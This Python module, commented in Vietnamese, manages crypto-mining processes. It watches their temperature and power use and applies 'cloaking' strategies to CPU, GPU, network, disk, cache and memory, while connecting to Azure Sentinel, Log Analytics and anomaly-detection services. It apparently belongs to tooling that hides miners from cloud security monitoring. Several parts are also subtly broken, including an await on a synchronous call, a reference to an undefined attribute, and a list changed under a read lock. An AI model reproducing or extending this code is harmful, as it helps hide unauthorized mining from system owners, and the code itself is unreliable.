# resource_manager.py

import os
import logging
import psutil
import pynvml
import traceback
import asyncio
from asyncio import Queue as AsyncQueue
from typing import List, Any, Dict, Optional, Tuple
from itertools import count
from contextlib import asynccontextmanager
from threading import Lock
from time import time

from readerwriterlock import rwlock

# Import các module phụ trợ từ dự án
from .base_manager import BaseManager
from .utils import MiningProcess, GPUManager
from .cloak_strategies import CloakStrategy, CloakStrategyFactory
from .resource_control import ResourceControlFactory  # Import ResourceControlFactory

# Import Interface
from .interfaces import IResourceManager

# CHỈ GIỮ LẠI các import từ azure_clients TRỪ AzureTrafficAnalyticsClient
from .azure_clients import (
    AzureSentinelClient,
    AzureLogAnalyticsClient,
    AzureNetworkWatcherClient,
    AzureAnomalyDetectorClient
    # AzureTrafficAnalyticsClient đã được loại bỏ
    # AzureOpenAIClient đã được loại bỏ
)

from .auxiliary_modules import temperature_monitor
from .auxiliary_modules.power_management import (
    PowerManager,
    get_cpu_power,
    get_gpu_power,
    set_gpu_usage,
    shutdown_power_management
)

import aiofiles  # Thêm aiofiles để xử lý I/O bất đồng bộ

@asynccontextmanager
async def acquire_lock_with_timeout(lock: rwlock.RWLockFair, lock_type: str, timeout: float):
    """
    Async context manager để chiếm khóa với timeout.

    Args:
        lock (rwlock.RWLockFair): Đối tượng RWLockFair.
        lock_type (str): 'read' hoặc 'write'.
        timeout (float): Thời gian chờ (giây).

    Yields:
        The acquired lock object nếu thành công, None nếu timeout.
    """
    if lock_type == 'read':
        acquired_lock = lock.gen_rlock()
    elif lock_type == 'write':
        acquired_lock = lock.gen_wlock()
    else:
        raise ValueError("lock_type phải là 'read' hoặc 'write'.")

    try:
        await asyncio.wait_for(acquired_lock.acquire(), timeout=timeout)
        try:
            yield acquired_lock
        finally:
            acquired_lock.release()
    except asyncio.TimeoutError:
        yield None

class SharedResourceManager:
    """
    Lớp cung cấp các hàm điều chỉnh tài nguyên (CPU, RAM, GPU, Disk, Network...).
    Tích hợp chặt chẽ với ResourceControlFactory để quản lý các resource managers.
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        """
        Khởi tạo SharedResourceManager với cấu hình và logger.

        Args:
            config (Dict[str, Any]): Cấu hình tài nguyên.
            logger (logging.Logger): Logger để ghi log.
        """
        self.config = config
        self.logger = logger
        self.gpu_manager = GPUManager()
        self.power_manager = PowerManager()
        self.strategy_cache = {}  # Thêm cache cho chiến lược

        # Khởi tạo các resource managers thông qua ResourceControlFactory
        self.resource_managers = ResourceControlFactory.create_resource_managers(self.logger)

    def is_gpu_initialized(self) -> bool:
        """
        Kiểm tra xem GPU đã được khởi tạo hay chưa.
        """
        self.logger.debug(
            f"Checking GPU initialization: {self.gpu_manager.gpu_initialized}"
        )
        return self.gpu_manager.gpu_initialized

    def shutdown_nvml(self):
        """
        Đóng NVML khi không cần thiết.
        """
        self.gpu_manager.shutdown_nvml()  # Sử dụng GPUManager để shutdown NVML

    async def get_process_cache_usage(self, pid: int) -> float:
        """
        Lấy usage cache của tiến trình từ /proc/[pid]/status.

        Args:
            pid (int): PID của tiến trình.

        Returns:
            float: Cache usage phần trăm.
        """
        try:
            status_file = f"/proc/{pid}/status"
            async with aiofiles.open(status_file, 'r') as f:
                async for line in f:
                    if line.startswith("VmCache:"):
                        cache_kb = int(line.split()[1])  # VmCache: 12345 kB
                        total_mem_kb = psutil.virtual_memory().total / 1024  # Tổng bộ nhớ hệ thống tính bằng kB
                        cache_percent = (cache_kb / total_mem_kb) * 100
                        self.logger.debug(f"PID={pid} sử dụng cache: {cache_percent:.2f}%")
                        return cache_percent
            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
            return 0.0
        except FileNotFoundError:
            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi get_process_cache_usage cho PID={pid}: {e}\n{traceback.format_exc()}")
            return 0.0

    async def get_gpu_usage_percent(self, pid: int) -> float:
        """
        Lấy tỉ lệ sử dụng GPU của tiến trình dựa trên PID.

        Args:
            pid (int): PID của tiến trình.

        Returns:
            float: Tỉ lệ sử dụng GPU (0.0 - 100.0).
        """
        try:
            loop = asyncio.get_event_loop()
            return await loop.run_in_executor(None, self._sync_get_gpu_usage_percent, pid)
        except Exception as e:
            self.logger.error(f"Lỗi bất ngờ trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        """
        Phương thức đồng bộ để lấy GPU usage, được gọi từ async context.

        Args:
            pid (int): PID của tiến trình.

        Returns:
            float: Tỉ lệ sử dụng GPU.
        """
        try:
            pynvml.nvmlInit()
            device_count = pynvml.nvmlDeviceGetCount()
            total_gpu_usage = 0.0
            gpu_present = False

            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                # Lấy thông tin tiến trình đang sử dụng GPU
                procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                for proc in procs:
                    if proc.pid == pid:
                        gpu_present = True
                        # Lấy tỉ lệ sử dụng GPU
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        total_gpu_usage += utilization.gpu  # Tỉ lệ sử dụng GPU
            pynvml.nvmlShutdown()

            if gpu_present:
                return total_gpu_usage  # Nếu tiến trình đang sử dụng GPU
            else:
                return 0.0  # Không sử dụng GPU
        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi không xác định trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        Áp dụng một chiến lược cloaking cho tiến trình đã cho.

        Args:
            strategy_name (str): Tên của chiến lược cloaking (ví dụ: 'cpu', 'gpu', 'memory').
            process (MiningProcess): Đối tượng tiến trình khai thác.
        """
        try:
            pid = process.pid
            name = process.name

            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.resource_managers
            )

            if not strategy:
                self.logger.error(f"Failed to create strategy '{strategy_name}'. Strategy is None.")
                return
            if not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"Invalid strategy: {strategy.__class__.__name__} does not implement a callable 'apply' method.")
                return

            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
            strategy.apply(process)
            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi không xác định khi áp dụng cloaking '{strategy_name}' cho {name} (PID: {pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    async def restore_resources(self, process: MiningProcess):
        """
        Khôi phục tài nguyên cho tiến trình đã cloaked.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
        """
        try:
            pid = process.pid
            name = process.name
            restored = False

            # Khôi phục các tài nguyên đã điều chỉnh bằng cách sử dụng resource managers
            for controller, manager in self.resource_managers.items():
                success = await asyncio.get_event_loop().run_in_executor(None, manager.restore_resources, pid)
                if success:
                    self.logger.info(f"Đã khôi phục tài nguyên '{controller}' cho PID={pid}.")
                    restored = True
                else:
                    self.logger.error(f"Không thể khôi phục tài nguyên '{controller}' cho PID={pid}.")

            if restored:
                self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID: {pid}).")
            else:
                self.logger.warning(f"Không tìm thấy tài nguyên nào để khôi phục cho {name} (PID: {pid}).")
        except psutil.NoSuchProcess:
            self.logger.error(f"Tiến trình PID={process.pid} không tồn tại khi khôi phục tài nguyên.")
        except psutil.AccessDenied:
            self.logger.error(f"Không đủ quyền để khôi phục tài nguyên cho PID={process.pid}.")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khôi phục tài nguyên cho tiến trình {name} (PID: {pid}): {e}\n{traceback.format_exc()}"
            )
            raise

class ResourceManager(BaseManager, IResourceManager):
    """
    Lớp quản lý tài nguyên hệ thống, chịu trách nhiệm giám sát và điều chỉnh tài nguyên cho các tiến trình khai thác.
    Đây là một Singleton để đảm bảo chỉ có một instance của ResourceManager tồn tại.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        BaseManager.__init__(self, config, logger)
        if getattr(self, '_initialized', False):
            return
        self._initialized = True

        self.config = config
        self.logger = logger

        self.stop_event = asyncio.Event()
        self.resource_lock = rwlock.RWLockFair()
        self.resource_adjustment_queue = AsyncQueue()
        self.processed_tasks = set()

        self.mining_processes = []
        self.mining_processes_lock = rwlock.RWLockFair()
        self._counter = count()

        # Khởi tạo các client Azure (đã bỏ AzureSecurityCenterClient và AzureTrafficAnalyticsClient)
        self.initialize_azure_clients()
        self.discover_azure_resources()

        # Khởi tạo SharedResourceManager với resource_managers mới
        self.shared_resource_manager = SharedResourceManager(config, logger)

        # Sử dụng asyncio.Queue thay thế cho PriorityQueue để phù hợp với async programming
        self.resource_adjustment_queue = AsyncQueue()

        # Không sử dụng ThreadPoolExecutor; chuyển sang sử dụng asyncio tasks

    def initialize_azure_clients(self):
        """
        Khởi tạo các client Azure cần thiết.
        """
        self.azure_sentinel_client = AzureSentinelClient(self.logger)
        self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
        self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
        self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config)
        # ĐÃ BỎ self.azure_openai_client
        # self.azure_openai_client = AzureOpenAIClient(self.logger, self.config)

    def discover_azure_resources(self):
        """
        Khám phá các tài nguyên Azure cần thiết.
        """
        try:
            self.network_watchers = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkWatchers'
            )
            self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")

            self.nsgs = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkSecurityGroups'
            )
            self.logger.info(f"Khám phá {len(self.nsgs)} NSGs.")

            # Đã loại bỏ việc khám phá Traffic Analytics Workspaces
            self.logger.info("Khám phá Traffic Analytics Workspaces đã bị loại bỏ.")

        except Exception as e:
            self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")

    async def enqueue_cloaking(self, process: MiningProcess):
        """
        Enqueue tiến trình vào queue yêu cầu cloaking thông qua resource_adjustment_queue.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
        """
        try:
            task = {
                'type': 'cloaking',
                'process': process,
                'strategies': ['cpu', 'gpu', 'cache', 'network', 'memory', 'disk_io']  # Tất cả các chiến lược cloaking chính
            }
            priority = 1  # Yêu cầu cloaking có ưu tiên cao nhất
            count_val = next(self._counter)
            await self.resource_adjustment_queue.put((priority, count_val, task))
            self.logger.info(f"Đã enqueue yêu cầu cloaking cho tiến trình {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue yêu cầu cloaking cho PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def enqueue_restoration(self, process: MiningProcess):
        """
        Enqueue tiến trình vào queue yêu cầu khôi phục tài nguyên thông qua resource_adjustment_queue.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
        """
        try:
            task = {
                'type': 'restoration',
                'process': process
            }
            priority = 2  # Yêu cầu khôi phục có ưu tiên thấp hơn cloaking
            count_val = next(self._counter)
            await self.resource_adjustment_queue.put((priority, count_val, task))
            self.logger.info(f"Đã enqueue yêu cầu khôi phục tài nguyên cho tiến trình {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue yêu cầu khôi phục tài nguyên cho PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def discover_mining_processes_async(self):
        """
        Khám phá các tiến trình khai thác đang chạy trên hệ thống dựa trên cấu hình.
        """
        try:
            cpu_name = self.config['processes'].get('CPU', '').lower()
            gpu_name = self.config['processes'].get('GPU', '').lower()

            async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', timeout=5) as read_lock:
                if read_lock is None:
                    self.logger.error("Failed to acquire mining_processes_lock trong discover_mining_processes.")
                    return

                self.mining_processes.clear()
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        pname = proc.info['name'].lower()
                        if cpu_name in pname or gpu_name in pname:
                            prio = self.get_process_priority(proc.info['name'])
                            net_if = self.config.get('network_interface', 'eth0')
                            mining_proc = MiningProcess(
                                proc.info['pid'], proc.info['name'], prio, net_if, self.logger
                            )
                            self.mining_processes.append(mining_proc)
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        continue
                self.logger.info(
                    f"Khám phá {len(self.mining_processes)} tiến trình khai thác."
                )
        except Exception as e:
            self.logger.error(f"Lỗi discover_mining_processes: {e}\n{traceback.format_exc()}")

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy độ ưu tiên của tiến trình dựa trên tên.

        Args:
            process_name (str): Tên của tiến trình.

        Returns:
            int: Độ ưu tiên của tiến trình.
        """
        priority_map = self.config.get('process_priority_map', {})
        pri_val = priority_map.get(process_name.lower(), 1)
        if isinstance(pri_val, dict) or not isinstance(pri_val, int):
            self.logger.warning(
                f"Priority cho tiến trình '{process_name}' không phải là int => gán 1."
            )
            return 1
        return pri_val

    async def monitor_and_adjust(self):
        """
        Coroutine để giám sát và điều chỉnh tài nguyên dựa trên các thông số như nhiệt độ và công suất.
        """
        mon_params = self.config.get("monitoring_parameters", {})
        temp_intv = mon_params.get("temperature_monitoring_interval_seconds", 60)
        power_intv = mon_params.get("power_monitoring_interval_seconds", 60)

        while not self.stop_event.is_set():
            try:
                # 1) Cập nhật danh sách mining_processes
                await self.discover_mining_processes_async()

                # 2) Kiểm tra nhiệt độ CPU/GPU, nếu vượt ngưỡng thì enqueue cloak
                temp_lims = self.config.get("temperature_limits", {})
                cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
                gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)

                tasks = []
                for proc in self.mining_processes:
                    task = self.check_temperature_and_enqueue(proc, cpu_max_temp, gpu_max_temp)
                    tasks.append(task)
                await asyncio.gather(*tasks)

                # 3) Kiểm tra công suất CPU/GPU, nếu vượt ngưỡng thì enqueue cloak
                power_limits = self.config.get("power_limits", {})
                per_dev_power = power_limits.get("per_device_power_watts", {})

                cpu_max_pwr = per_dev_power.get("cpu", 150)
                if not isinstance(cpu_max_pwr, (int, float)):
                    self.logger.warning(f"cpu_max_power invalid: {cpu_max_pwr}, default=150")
                    cpu_max_pwr = 150

                gpu_max_pwr = per_dev_power.get("gpu", 300)
                if not isinstance(gpu_max_pwr, (int, float)):
                    self.logger.warning(f"gpu_max_power invalid: {gpu_max_pwr}, default=300")
                    gpu_max_pwr = 300

                tasks = []
                for proc in self.mining_processes:
                    task = self.check_power_and_enqueue(proc, cpu_max_pwr, gpu_max_pwr)
                    tasks.append(task)
                await asyncio.gather(*tasks)

                # 4) Thu thập metrics (nếu vẫn cần để giám sát)
                metrics_data = await self.collect_all_metrics()

                # Loại bỏ các phần liên quan đến OpenAI

            except Exception as e:
                self.logger.error(f"Lỗi monitor_and_adjust: {e}\n{traceback.format_exc()}")

            # 5) Nghỉ theo chu kỳ lớn nhất (mặc định 60 giây)
            await asyncio.sleep(max(temp_intv, power_intv))

    async def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
        """
        Kiểm tra nhiệt độ CPU và GPU của tiến trình và enqueue các điều chỉnh nếu cần.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
            cpu_max_temp (int): Ngưỡng nhiệt độ CPU tối đa (°C).
            gpu_max_temp (int): Ngưỡng nhiệt độ GPU tối đa (°C).
        """
        try:
            cpu_temp = await asyncio.get_event_loop().run_in_executor(None, temperature_monitor.get_cpu_temperature, process.pid)
            gpu_temp = await asyncio.get_event_loop().run_in_executor(None, temperature_monitor.get_gpu_temperature, process.pid)

            adjustments = {}
            if cpu_temp is not None and cpu_temp > cpu_max_temp:
                self.logger.warning(
                    f"Nhiệt độ CPU {cpu_temp}°C > {cpu_max_temp}°C (PID={process.pid})."
                )
                adjustments['cpu_cloak'] = True
            if gpu_temp is not None and gpu_temp > gpu_max_temp:
                self.logger.warning(
                    f"Nhiệt độ GPU {gpu_temp}°C > {gpu_max_temp}°C (PID={process.pid})."
                )
                adjustments['gpu_cloak'] = True

            if adjustments:
                task = {
                    'type': 'monitoring',
                    'process': process,
                    'adjustments': adjustments
                }
                priority = 2
                count_val = next(self._counter)
                await self.resource_adjustment_queue.put((priority, count_val, task))
        except Exception as e:
            self.logger.error(f"check_temperature_and_enqueue error: {e}\n{traceback.format_exc()}")

    async def check_power_and_enqueue(self, process: MiningProcess, cpu_max_power: int, gpu_max_power: int):
        """
        Kiểm tra công suất CPU và GPU của tiến trình và enqueue các điều chỉnh nếu cần.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
            cpu_max_power (int): Ngưỡng công suất CPU tối đa (W).
            gpu_max_power (int): Ngưỡng công suất GPU tối đa (W).
        """
        try:
            c_power = await asyncio.get_event_loop().run_in_executor(None, get_cpu_power, process.pid)
            if self.shared_resource_manager.is_gpu_initialized():
                g_power = await asyncio.get_event_loop().run_in_executor(None, get_gpu_power, process.pid)
            else:
                g_power = 0.0

            adjustments = {}
            if c_power > cpu_max_power:
                self.logger.warning(
                    f"CPU power={c_power}W > {cpu_max_power}W (PID={process.pid})."
                )
                adjustments['cpu_cloak'] = True

            # Kiểm tra nếu g_power là list
            if isinstance(g_power, list):
                total_g_power = sum(g_power)
                self.logger.debug(f"Total GPU power for PID={process.pid}: {total_g_power}W")
                if total_g_power > gpu_max_power:
                    self.logger.warning(
                        f"Tổng GPU power={total_g_power}W > {gpu_max_power}W (PID={process.pid})."
                    )
                    adjustments['gpu_cloak'] = True
            else:
                if g_power > gpu_max_power:
                    self.logger.warning(
                        f"GPU power={g_power}W > {gpu_max_power}W (PID={process.pid})."
                    )
                    adjustments['gpu_cloak'] = True

            if adjustments:
                task = {
                    'type': 'monitoring',
                    'process': process,
                    'adjustments': adjustments
                }
                priority = 2
                count_val = next(self._counter)
                await self.resource_adjustment_queue.put((priority, count_val, task))
        except Exception as e:
            self.logger.error(f"check_power_and_enqueue error: {e}\n{traceback.format_exc()}")

    async def apply_monitoring_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
        """
        Áp dụng các điều chỉnh dựa trên các thông số giám sát (nhiệt độ, công suất).

        Args:
            adjustments (Dict[str, Any]): Dictionary chứa các điều chỉnh cần áp dụng.
            process (MiningProcess): Đối tượng tiến trình khai thác.
        """
        try:
            if adjustments.get('cpu_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('cpu', process)
            if adjustments.get('gpu_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('gpu', process)
            if adjustments.get('network_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('network', process)
            if adjustments.get('io_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('disk_io', process)
            if adjustments.get('cache_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('cache', process)
            if adjustments.get('memory_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('memory', process)

            self.logger.info(
                f"Áp dụng điều chỉnh monitor cho {process.name} (PID: {process.pid})."
            )
        except Exception as e:
            self.logger.error(f"apply_monitoring_adjustments error: {e}\n{traceback.format_exc()}")

    async def process_resource_adjustments(self):
        """
        Coroutine để xử lý các điều chỉnh tài nguyên từ queue.
        """
        while not self.stop_event.is_set():
            try:
                priority, count_val, task = await asyncio.wait_for(self.resource_adjustment_queue.get(), timeout=1)
                if task['type'] == 'monitoring':
                    await self.apply_monitoring_adjustments(task['adjustments'], task['process'])
                elif task['type'] == 'cloaking':
                    strategies = task['strategies']
                    for strategy in strategies:
                        if strategy not in self.shared_resource_manager.strategy_cache:
                            strategy_instance = CloakStrategyFactory.create_strategy(
                                strategy,
                                self.config,
                                self.logger,
                                self.resource_managers
                            )
                            self.shared_resource_manager.strategy_cache[strategy] = strategy_instance
                        else:
                            strategy_instance = self.shared_resource_manager.strategy_cache[strategy]

                        if strategy_instance and callable(getattr(strategy_instance, 'apply', None)):
                            self.logger.info(f"Áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}")
                            strategy_instance.apply(task['process'])
                        else:
                            self.logger.error(f"Không thể áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}")
                elif task['type'] == 'restoration':
                    await self.shared_resource_manager.restore_resources(task['process'])
                self.resource_adjustment_queue.task_done()
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                self.logger.error(f"Lỗi trong process_resource_adjustments: {e}\n{traceback.format_exc()}")

    async def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """
        Thu thập các metrics cho một tiến trình cụ thể.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.

        Returns:
            Dict[str, Any]: Dictionary chứa các metrics của tiến trình.
        """
        try:
            p_obj = psutil.Process(process.pid)
            cpu_pct = p_obj.cpu_percent(interval=1)
            mem_mb = p_obj.memory_info().rss / (1024**2)
            
            # Thu thập tỉ lệ sử dụng GPU đúng cách
            if self.shared_resource_manager.is_gpu_initialized():
                gpu_pct = await self.shared_resource_manager.get_gpu_usage_percent(process.pid)
            else:
                gpu_pct = 0.0
            
            disk_mbps = await asyncio.get_event_loop().run_in_executor(None, temperature_monitor.get_current_disk_io_limit, process.pid)
            net_bw = float(self.config.get('resource_allocation', {})
                                    .get('network', {})
                                    .get('bandwidth_limit_mbps', 100.0))  # Đảm bảo là float

            # Lấy metrics cache thông qua SharedResourceManager
            cache_l = await self.shared_resource_manager.get_process_cache_usage(process.pid) 

            # Lấy metrics memory nếu cần
            if 'memory' in self.shared_resource_manager.resource_managers:
                memory_limit_mb = self.shared_resource_manager.resource_managers['memory'].get_memory_limit(
                    process.pid
                ) / (1024**2)
            else:
                memory_limit_mb = 0.0

            metrics = {
                'cpu_usage_percent': float(cpu_pct),
                'memory_usage_mb': float(mem_mb),
                'gpu_usage_percent': float(gpu_pct),
                'disk_io_mbps': float(disk_mbps),
                'network_bandwidth_mbps': net_bw,
                'cache_limit_percent': float(cache_l),
                'memory_limit_mb': float(memory_limit_mb)
            }

            # Kiểm tra từng giá trị metrics để đảm bảo tính hợp lệ
            invalid_metrics = [k for k, v in metrics.items() if not isinstance(v, (int, float))]
            if invalid_metrics:
                self.logger.error(
                    f"Metrics cho PID={process.pid} chứa giá trị không hợp lệ: {invalid_metrics}. Dữ liệu: {metrics}"
                )
                return {}  # Bỏ qua PID này

            self.logger.debug(f"Metrics for PID {process.pid}: {metrics}")
            return metrics
        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID={process.pid} không tồn tại khi thu thập metrics.")
            return {}
        except Exception as e:
            self.logger.error(
                f"Lỗi collect_metrics cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return {}

    async def collect_all_metrics(self) -> Dict[str, Any]:
        """
        Thu thập toàn bộ metrics cho tất cả các tiến trình khai thác.
        Trả về một dictionary với key là PID và value là các metrics.

        Returns:
            Dict[str, Any]: Dictionary chứa các metrics của tất cả các tiến trình.
        """
        metrics_data = {}
        try:
            async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', timeout=5) as read_lock:
                if read_lock is None:
                    self.logger.error("Timeout khi acquire mining_processes_lock trong collect_all_metrics.")
                    return metrics_data

                tasks = []
                for proc in self.mining_processes:
                    task = self.collect_metrics(proc)
                    tasks.append(task)

                results = await asyncio.gather(*tasks)

                for proc, metrics in zip(self.mining_processes, results):
                    if not isinstance(metrics, dict):
                        self.logger.error(
                            f"Metrics cho PID={proc.pid} không phải là dict. Dữ liệu nhận được: {metrics}"
                        )
                        continue  # Bỏ qua PID này
                    # Kiểm tra từng giá trị trong metrics
                    invalid_metrics = [k for k, v in metrics.items() if not isinstance(v, (int, float))]
                    if invalid_metrics:
                        self.logger.error(
                            f"Metrics cho PID={proc.pid} chứa giá trị không hợp lệ: {invalid_metrics}. Dữ liệu: {metrics}"
                        )
                        continue  # Bỏ qua PID này
                    metrics_data[str(proc.pid)] = metrics
                self.logger.debug(f"Collected metrics data: {metrics_data}")
        except Exception as e:
            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
        return metrics_data

    async def shutdown(self):
        """
        Dừng ResourceManager, bao gồm việc dừng các coroutine và tắt power management.
        """
        self.logger.info("Dừng ResourceManager...")
        self.stop_event.set()
        # Chờ các task hoàn thành
        await asyncio.sleep(1)
        await self.shared_resource_manager.shutdown_nvml()
        # Khôi phục tài nguyên đã điều chỉnh nếu cần
        tasks = []
        for proc in self.mining_processes:
            task = self.shared_resource_manager.restore_resources(proc)
            tasks.append(task)
        await asyncio.gather(*tasks)
        self.logger.info("ResourceManager đã dừng.")
        shutdown_power_management()  # Gọi hàm shutdown_power_management trực tiếp

    async def start(self):
        """
        Bắt đầu ResourceManager bằng cách khởi động các coroutine giám sát và xử lý điều chỉnh tài nguyên.
        """
        self.logger.info("Bắt đầu ResourceManager...")
        # Khởi động coroutine giám sát và điều chỉnh tài nguyên
        asyncio.create_task(self.monitor_and_adjust())
        asyncio.create_task(self.process_resource_adjustments())
        self.logger.info("ResourceManager đã được khởi động.")

